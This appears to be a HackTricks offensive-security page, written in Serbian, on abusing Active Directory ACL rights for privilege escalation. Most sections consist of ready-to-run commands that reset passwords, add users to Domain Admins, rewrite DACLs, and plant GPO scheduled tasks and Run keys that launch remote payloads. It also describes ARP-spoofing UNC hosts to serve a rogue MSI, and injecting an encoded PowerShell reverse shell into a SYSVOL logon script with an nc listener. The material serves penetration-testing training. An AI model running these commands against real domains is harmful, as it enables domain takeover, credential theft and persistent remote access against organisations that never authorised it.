# Zloupotreba Active Directory ACL-ova/ACE-ova

{{#include ../../../banners/hacktricks-training.md}}

**Ova stranica je uglavnom sažetak tehnika iz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Za više detalja pogledajte originalne članke.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll prava nad korisnikom**

Ova privilegija napadaču daje potpunu kontrolu nad ciljnim korisničkim nalogom. Kada se prava `GenericAll` potvrde pomoću komande `Get-ObjectAcl`, napadač može:

- **Promeniti lozinku ciljnog korisnika**: Pomoću komande `net user <username> <password> /domain`, napadač može resetovati lozinku korisnika.
- Sa Linuxa, isto možete uraditi preko SAMR-a koristeći Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Ako je nalog onemogućen, uklonite UAC zastavicu**: `GenericAll` omogućava uređivanje atributa `userAccountControl`. Sa Linuxa, BloodyAD može ukloniti zastavicu `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Dodelite SPN korisničkom nalogu da bi mogao da bude meta kerberoasting-a, zatim koristite Rubeus i targetedKerberoast.py za izdvajanje i pokušaj crackovanja hash-eva ticket-granting ticket-a (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Ciljani ASREPRoasting**: Onemogućite pre-autentifikaciju za korisnika, čime njegov nalog postaje ranjiv na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Sa `GenericAll` pravima nad korisnikom možete dodati credential zasnovan na sertifikatu i autentifikovati se kao taj korisnik bez promene njegove lozinke. Pogledajte:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll prava nad grupom**

Ova privilegija omogućava napadaču da manipuliše članstvom u grupi ako ima `GenericAll` prava nad grupom kao što je `Domain Admins`. Nakon identifikovanja distinguished name grupe pomoću `Get-NetGroup`, napadač može:

- **Dodati sebe u grupu Domain Admins**: Ovo se može uraditi direktnim komandama ili korišćenjem modula kao što su Active Directory ili PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Sa Linux-a takođe možete iskoristiti BloodyAD da sebe dodate u proizvoljne grupe kada imate GenericAll/Write prava nad njima. Ako je ciljna grupa ugnježdena u „Remote Management Users“, odmah ćete dobiti WinRM pristup hostovima koji poštuju tu grupu:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Posedovanje ovih privilegija nad objektom računara ili korisničkim nalogom omogućava:

- **Kerberos Resource-based Constrained Delegation**: Omogućava preuzimanje kontrole nad objektom računara.
- **Shadow Credentials**: Korišćenje ove tehnike za lažno predstavljanje računarskog ili korisničkog naloga iskorišćavanjem privilegija za kreiranje shadow credentials.

## **WriteProperty on Group**

Ako korisnik ima prava `WriteProperty` nad svim objektima za određenu grupu (npr. `Domain Admins`), može:

- **Dodati sebe u grupu Domain Admins**: Ovo se može postići kombinovanjem komandi `net user` i `Add-NetGroupUser`, čime se omogućava eskalacija privilegija unutar domena.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) nad grupom**

Ova privilegija napadačima omogućava da se dodaju u određene grupe, kao što je `Domain Admins`, pomoću komandi koje direktno menjaju članstvo u grupi. Korišćenje sledećeg niza komandi omogućava samostalno dodavanje:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Slična privilegija omogućava napadačima da se direktno dodaju u grupe izmenom svojstava grupa, ako imaju pravo `WriteProperty` nad tim grupama. Potvrda i izvršavanje ove privilegije obavljaju se pomoću:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posedovanje prava `ExtendedRight` nad korisnikom za `User-Force-Change-Password` omogućava resetovanje lozinki bez poznavanja trenutne lozinke. Provera ovog prava i njegova eksploatacija mogu se obaviti kroz PowerShell ili alternativne command-line alate, što pruža više metoda za resetovanje lozinke korisnika, uključujući interaktivne sesije i one-liners za neinteraktivna okruženja. Komande se kreću od jednostavnih PowerShell poziva do korišćenja `rpcclient` na Linuxu, demonstrirajući svestranost attack vektora.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner nad grupom**

Ako napadač utvrdi da ima `WriteOwner` prava nad grupom, može da promeni vlasništvo nad grupom i postavi sebe za vlasnika. Ovo je naročito značajno kada je predmetna grupa `Domain Admins`, jer promena vlasništva omogućava širu kontrolu nad atributima i članstvom grupe. Proces podrazumeva identifikovanje odgovarajućeg objekta pomoću `Get-ObjectAcl`, a zatim korišćenje `Set-DomainObjectOwner` za izmenu vlasnika, bilo putem SID-a ili imena.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Ova dozvola napadaču omogućava izmenu svojstava korisnika. Konkretno, uz pristup `GenericWrite`, napadač može da promeni putanju logon skripte korisnika kako bi se zlonamerna skripta izvršila prilikom prijavljivanja korisnika. To se postiže korišćenjem komande `Set-ADObject` za ažuriranje svojstva `scriptpath` ciljnog korisnika tako da pokazuje na skriptu napadača.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite nad grupom**

Sa ovom privilegijom, napadači mogu da menjaju članstvo u grupama, na primer da dodaju sebe ili druge korisnike u određene grupe. Ovaj proces obuhvata kreiranje credential objekta, njegovo korišćenje za dodavanje ili uklanjanje korisnika iz grupe i proveru promena članstva pomoću PowerShell komandi.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Sa Linux-a, Samba `net` može da dodaje/uklanja članove kada imate `GenericWrite` nad grupom (korisno kada PowerShell/RSAT nisu dostupni):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Posedovanje AD objekta i posedovanje privilegija `WriteDACL` nad njim omogućava napadaču da sebi dodeli privilegije `GenericAll` nad objektom. Ovo se postiže pomoću ADSI manipulacije, čime se omogućava potpuna kontrola nad objektom i mogućnost izmene članstva u njegovim grupama. Ipak, postoje ograničenja pri pokušaju iskorišćavanja ovih privilegija pomoću `Set-Acl` / `Get-Acl` cmdlet-a Active Directory modula.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner brzo preuzimanje (PowerView)

Kada imate `WriteOwner` i `WriteDacl` nad korisničkim ili servisnim nalogom, možete preuzeti punu kontrolu i resetovati njegovu lozinku koristeći PowerView, bez poznavanja stare lozinke:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Napomena:
- Možda ćete prvo morati da promenite vlasnika na sebe ako imate samo `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Proverite pristup pomoću bilo kog protokola (SMB/LDAP/RDP/WinRM) nakon resetovanja lozinke.

## **Replikacija na domenu (DCSync)**

DCSync attack koristi određene dozvole za replikaciju na domenu kako bi oponašao Domain Controller i sinhronizovao podatke, uključujući korisničke kredencijale. Ova moćna tehnika zahteva dozvole kao što je `DS-Replication-Get-Changes`, koje napadačima omogućavaju da izvuku osetljive informacije iz AD okruženja bez direktnog pristupa Domain Controller-u.<sup>[[5]](#references)</sup> [**Više informacija o DCSync attack-u možete pronaći ovde.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegirani pristup upravljanju Group Policy Objects (GPOs) može predstavljati značajan bezbednosni rizik. Na primer, ako korisnik kao što je `offense\spotless` ima delegirana prava za upravljanje GPO-ovima, može posedovati privilegije kao što su **WriteProperty**, **WriteDacl** i **WriteOwner**. Ove dozvole mogu biti zloupotrebljene u zlonamerne svrhe, što je identifikovano pomoću PowerView-a: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Da bi se identifikovali pogrešno konfigurisani GPO-ovi, PowerSploit cmdlet-i mogu se povezati u niz. To omogućava otkrivanje GPO-ova kojima određeni korisnik ima pravo da upravlja: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Računari na kojima je određena politika primenjena**: Moguće je utvrditi na koje računare se odnosi određeni GPO, što pomaže u razumevanju obima potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politike primenjene na određenom računaru**: Da biste videli koje se politike primenjuju na konkretnom računaru, mogu se koristiti komande kao što je `Get-DomainGPO`.

**OU-ovi na koje je određena politika primenjena**: Identifikovanje organizacionih jedinica (OU-ova) na koje određena politika utiče može se izvršiti pomoću `Get-DomainOU`.

Takođe možete koristiti alat [**GPOHound**](https://github.com/cogiceo/GPOHound) za enumeraciju GPO-ova i pronalaženje problema u njima.

### Abuse GPO - New-GPOImmediateTask

Pogrešno konfigurisani GPO-ovi mogu se iskoristiti za izvršavanje koda, na primer kreiranjem neposrednog scheduled task-a. Ovo se može iskoristiti za dodavanje korisnika u grupu lokalnih administratora na pogođenim računarima, čime se privilegije značajno uvećavaju:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy modul - Zloupotreba GPO-a

GroupPolicy modul, ako je instaliran, omogućava kreiranje i povezivanje novih GPO-ova, kao i podešavanje preferenci, poput vrednosti registra, radi izvršavanja backdoor-a na pogođenim računarima. Ovaj metod zahteva da se GPO ažurira i da se korisnik prijavi na računar kako bi se izvršavanje pokrenulo:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse pruža način za zloupotrebu postojećih GPO-ova dodavanjem zadataka ili izmenom podešavanja, bez potrebe za kreiranjem novih GPO-ova. Ovaj alat zahteva izmenu postojećih GPO-ova ili korišćenje RSAT alata za kreiranje novih pre primene izmena:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Prinudno ažuriranje policy-ja

GPO ažuriranja se obično izvršavaju otprilike svakih 90 minuta. Da bi se ovaj proces ubrzao, naročito nakon uvođenja izmene, na ciljnom računaru može se koristiti komanda `gpupdate /force` za prinudno trenutno ažuriranje policy-ja. Ova komanda obezbeđuje da se sve izmene GPO-ova primene bez čekanja na sledeći automatski ciklus ažuriranja.

### Ispod haube

Pregledom Scheduled Tasks za određeni GPO, kao što je `Misconfigured Policy`, može se potvrditi dodavanje zadataka poput `evilTask`. Ovi zadaci se kreiraju pomoću skripti ili command-line alata sa ciljem izmene ponašanja sistema ili eskalacije privilegija.

Struktura zadatka, prikazana u XML konfiguracionom fajlu koji generiše `New-GPOImmediateTask`, opisuje detalje scheduled task-a - uključujući komandu koja će se izvršiti i njegove okidače. Ovaj fajl predstavlja način na koji se scheduled tasks definišu i upravljaju unutar GPO-ova, pružajući metod za izvršavanje proizvoljnih komandi ili skripti u okviru sprovođenja policy-ja.

### Korisnici i grupe

GPO-ovi takođe omogućavaju manipulisanje članstvom korisnika i grupa na ciljnim sistemima. Direktnim uređivanjem policy fajlova Users and Groups, napadači mogu dodati korisnike u privilegovane grupe, kao što je lokalna grupa `administrators`. Ovo je moguće putem delegiranja dozvola za upravljanje GPO-ovima, koje dozvoljava izmenu policy fajlova radi uključivanja novih korisnika ili promene članstva u grupama.

XML konfiguracioni fajl za Users and Groups opisuje način implementacije ovih izmena. Dodavanjem unosa u ovaj fajl, određenim korisnicima mogu se dodeliti povišene privilegije na svim pogođenim sistemima. Ovaj metod pruža direktan pristup eskalaciji privilegija kroz manipulisanje GPO-ovima.

Pored toga, mogu se razmotriti i dodatni metodi za izvršavanje koda ili održavanje persistence-a, kao što su korišćenje logon/logoff skripti, izmena registry ključeva za autorun, instaliranje software-a putem `.msi` fajlova ili uređivanje konfiguracija servisa. Ove tehnike pružaju različite načine za održavanje pristupa i kontrolu ciljnih sistema kroz zloupotrebu GPO-ova.

### WriteGPLink + hijacking UNC putanje (ARP spoofing)

`WriteGPLink` nad OU/domain-om omogućava izmenu atributa `gPLink` ciljnog kontejnera i **prinudnu primenu postojećeg GPO-a** bez uređivanja samog GPO-a. Ovo postaje zanimljivo kada povezani GPO već upućuje na udaljeni sadržaj putem **UNC putanja** (`\\HOST\share\...`), jer autentifikovani korisnici mogu čitati **SYSVOL** i offline tražiti policy-je koji se mogu ponovo iskoristiti.<sup>[[11]](#references)</sup>

Workflow na visokom nivou:

1. Koristite BloodHound da identifikujete principal sa `WriteGPLink` nad OU-om i izlistate računare/korisnike unutar tog OU-a.
2. Klonirajte `SYSVOL` samo za čitanje i parsirajte GPO-ove tražeći **Software Installation**, **mapiranja diskova** (`Drives.xml`) i **logon/startup skripte** koje upućuju na UNC putanje.
3. Dajte prednost policy-jima koji upućuju na **direktno ime hosta** (na primer `\\DC02\share\pkg.msi`) umesto DFS/domain-namespace putanja, jer se putanje zasnovane na imenu hosta lakše preusmeravaju pomoću L2 spoofing-a.
4. Dodajte GUID izabranog GPO-a u `gPLink` ciljnog OU-a kako bi žrtva obrađivala tu već postojeću policy.
5. Na istom broadcast domain-u izvršite ARP spoofing UNC hosta i lokalno povežite njegovu IP adresu (`ip addr add <target_ip>/32 dev <iface>`) tako da SMB saobraćaj žrtve stigne do vašeg hosta.
6. Poslužite očekivanu putanju/ime fajla sa attacker SMB servera (na primer `smbserver.py`) i sačekajte normalnu obradu policy-ja.

Primer prikupljanja `SYSVOL` sadržaja i korelacije GPO-ova:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Povežite postojeći GPO sa ciljnom OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Ako povezani GPO deployuje MSI sa UNC putanje, klijent će ga preuzeti tokom **pokretanja računara** i instalirati kao **`NT AUTHORITY\SYSTEM`**. Lažiranjem referenciranog hosta i posluživanje malicioznog MSI-ja pod **istim share/path/name**, možete pretvoriti `WriteGPLink` u izvršavanje koda kao SYSTEM **bez menjanja SYSVOL-a**.

Važna ograničenja:

- **Tajming je važan**: nova veza se uočava pri osvežavanju policy-ja (obično nakon ~90 minuta), ali se **Software Installation** obično pokreće pri **restartu**.
- Windows Installer obično prati deployment koristeći **`ProductCode`** paketa. Ako je proizvod već instaliran, deployment može biti preskočen.
- Da biste izbegli odbijanje od strane installera, patch-ujte rogue MSI tako da njegovi **`ProductCode`** i **`PackageCode`** odgovaraju legitimnom paketu koji GPO očekuje.
- Stari `.aas` advertisement fajlovi mogu ostati u `SYSVOL`-u, zato proverite da deployment i dalje izgleda aktivno pre nego što se oslonite na njega.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP mapiranja diskova u `Drives.xml` uzrokuju da korisnici tokom prijavljivanja ili ponovnog povezivanja izvrše autentifikaciju na konfigurisanu UNC putanju. Ako lažirate navedeni host, možete uhvatiti **NetNTLMv2**. Ako se SMB namerno onemogući, Windows može ponovo pokušati preko **WebDAV**, šaljući **NTLM over HTTP**, što je mnogo fleksibilnije za relay ka **LDAP(S)**, **AD CS** ili **SMB**.

#### Logon/startup script UNC hijack

Isti obrazac važi za skripte hostovane na UNC putanjama koje se pronađu u `SYSVOL`:

- **Logon scripts** se obično izvršavaju u kontekstu **user** naloga.
- **Startup scripts** se obično izvršavaju u kontekstu **computer / SYSTEM** naloga.

Ako putanja skripte pokazuje na hostname koji se može lažirati, preusmerite UNC host i poslužite zamenski sadržaj skripte sa očekivane lokacije.

## SYSVOL/NETLOGON Logon Script Poisoning

Putanje sa dozvolom za upis ispod `\\<dc>\SYSVOL\<domain>\scripts\` ili `\\<dc>\NETLOGON\` omogućavaju izmenu logon skripti koje se izvršavaju prilikom prijavljivanja korisnika putem GPO-a. Ovo omogućava izvršavanje koda u bezbednosnom kontekstu korisnika koji se prijavljuju.

### Locate logon scripts
- Proverite atribute korisnika da biste pronašli konfigurisanu logon skriptu:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Pretražite deljene resurse domena da biste pronašli prečice ili reference ka skriptama:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analizirajte `.lnk` fajlove da biste razrešili ciljeve koji vode u SYSVOL/NETLOGON (koristan DFIR trik i za napadače bez direktnog pristupa GPO-u):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound prikazuje atribut `logonScript` (`scriptPath`) na čvorovima korisnika kada je prisutan.

### Proverite pristup za upis (ne verujte listama deljenih resursa)
Automatizovani alati mogu prikazati SYSVOL/NETLOGON kao resurse dostupne samo za čitanje, ali osnovni NTFS ACL-ovi i dalje mogu dozvoljavati upis. Uvek testirajte:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Ako se veličina fajla ili mtime promene, imate dozvolu za upis. Sačuvajte originale pre izmena.

### Poison a VBScript logon script for RCE
Dodajte komandu koja pokreće PowerShell reverse shell (generišite je na revshells.com) i zadržite originalnu logiku kako ne biste narušili poslovnu funkcionalnost:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Osluškujte na svom hostu i sačekajte sledeću interaktivnu prijavu:
```bash
rlwrap -cAr nc -lnvp 443
```
Napomene:
- Izvršavanje se odvija pod tokenom logging korisnika (ne SYSTEM). Opseg je GPO link (OU, site, domain) koji primenjuje tu skriptu.
- Nakon upotrebe izvršite cleanup tako što ćete vratiti originalni sadržaj/vremenske oznake.


## Reference

- [1] [Abusing Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts and Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – The ACL Attack Path Update](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Eskalacija privilegija pomoću ACL-ova u Active Directory-ju](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skeniranje Active Directory privilegija i privilegovanih naloga](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: zloupotreba AD ACL-ova, KeePassXC Argon2 cracking i DPAPI decryption do DC admin naloga](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
